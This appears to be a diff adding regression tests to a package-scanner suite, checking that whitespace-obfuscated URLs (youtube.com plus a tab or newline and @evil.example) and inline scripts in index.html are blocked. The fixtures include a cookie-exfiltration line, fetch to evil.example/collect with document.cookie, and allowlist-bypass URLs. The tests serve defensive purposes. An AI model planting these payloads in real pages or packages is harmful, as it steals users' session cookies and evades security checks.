@@ -172,4 +172,87 @@ describe("scanPackage", () => {
     expect(r.passed).toBe(false);
     expect(r.violations.some((v) => v.rule === "missing-engine-checksum")).toBe(true);
   });
+
+  // --- Re-attack regression tests (N1/N2/N3 whitespace/JSON-escape URL
+  // bypass, N4 index.html-is-the-audited-launcher) ---
+
+  it("N1: blocks a tab-obfuscated URL in intro (allowlist=[youtube.com], real host is evil.example)", () => {
+    const p = goodPackage();
+    const tab = String.fromCharCode(9);
+    const bad = { ...goodConfig, intro: `<a href="https://youtube.com${tab}@evil.example/x">c</a>` };
+    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
+    const r = scanPackage(p, ctx({ authoringConfig: bad, urlAllowlist: ["youtube.com"] }));
+    expect(r.passed).toBe(false);
+    expect(r.violations.some((v) => v.rule === "url-allowlist" && /evil\.example/i.test(v.detail))).toBe(true);
+  });
+
+  it("N2: blocks the same bypass using a newline instead of a tab", () => {
+    const p = goodPackage();
+    const nl = String.fromCharCode(10);
+    const bad = { ...goodConfig, intro: `<a href="https://youtube.com${nl}@evil.example/x">c</a>` };
+    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
+    const r = scanPackage(p, ctx({ authoringConfig: bad, urlAllowlist: ["youtube.com"] }));
+    expect(r.passed).toBe(false);
+    expect(r.violations.some((v) => v.rule === "url-allowlist" && /evil\.example/i.test(v.detail))).toBe(true);
+  });
+
+  it("N3: blocks a tab+dot subdomain-look-alike variant (youtube.com<TAB>.evil.example)", () => {
+    const p = goodPackage();
+    const tab = String.fromCharCode(9);
+    const bad = { ...goodConfig, intro: `<a href="https://youtube.com${tab}.evil.example/x">c</a>` };
+    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
+    const r = scanPackage(p, ctx({ authoringConfig: bad, urlAllowlist: ["youtube.com"] }));
+    expect(r.passed).toBe(false);
+    expect(r.violations.some((v) => v.rule === "url-allowlist" && /youtube\.com\.evil\.example/i.test(v.detail))).toBe(true);
+  });
+
+  it("control: the tab-obfuscated URL is still blocked under the default empty allowlist", () => {
+    const p = goodPackage();
+    const tab = String.fromCharCode(9);
+    const bad = { ...goodConfig, intro: `<a href="https://youtube.com${tab}@evil.example/x">c</a>` };
+    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
+    const r = scanPackage(p, ctx({ authoringConfig: bad }));
+    expect(r.passed).toBe(false);
+    expect(r.violations.some((v) => v.rule === "url-allowlist")).toBe(true);
+  });
+
+  it("N4: a legitimate index.html passes when supplied byte-exact as expectedIndexHtml", () => {
+    const p = goodPackage();
+    const exact = p.get("index.html")!;
+    const r = scanPackage(p, ctx({ expectedIndexHtml: exact }));
+    expect(r.passed).toBe(true);
+  });
+
+  it("N4: rejects index.html that doesn't byte-match expectedIndexHtml", () => {
+    const p = goodPackage();
+    const expected = Buffer.from("<!DOCTYPE html><html><head></head><body>a different launcher</body></html>");
+    const r = scanPackage(p, ctx({ expectedIndexHtml: expected }));
+    expect(r.passed).toBe(false);
+    expect(r.violations.some((v) => v.rule === "index-html-mismatch" && v.file === "index.html")).toBe(true);
+  });
+
+  it("N4: fallback mode (no expectedIndexHtml) blocks an added inline exfil <script> in index.html", () => {
+    const p = goodPackage();
+    p.set("index.html", Buffer.from(
+      '<html><body><script src="engine/engine.js"></script>' +
+      '<script>fetch("https://evil.example/collect?c=" + document.cookie)</script></body></html>'
+    ));
+    const r = scanPackage(p, ctx());
+    expect(r.passed).toBe(false);
+    expect(r.violations.some((v) => v.rule === "inline-script" && v.file === "index.html")).toBe(true);
+  });
+
+  it("N4: fallback mode is not fooled by a decoy data-src attribute on an inline exfil <script>", () => {
+    // A `data-src` attribute is not a real `src` — browsers still execute
+    // this script inline. A `\b`-based "does this have a src" check would
+    // wrongly treat "data-src=" as satisfying "has src" and skip it.
+    const p = goodPackage();
+    p.set("index.html", Buffer.from(
+      '<html><body><script src="engine/engine.js"></script>' +
+      '<script data-src="decoy">fetch("https://evil.example/collect?c=" + document.cookie)</script></body></html>'
+    ));
+    const r = scanPackage(p, ctx());
+    expect(r.passed).toBe(false);
+    expect(r.violations.some((v) => v.rule === "inline-script" && v.file === "index.html")).toBe(true);
+  });
 });
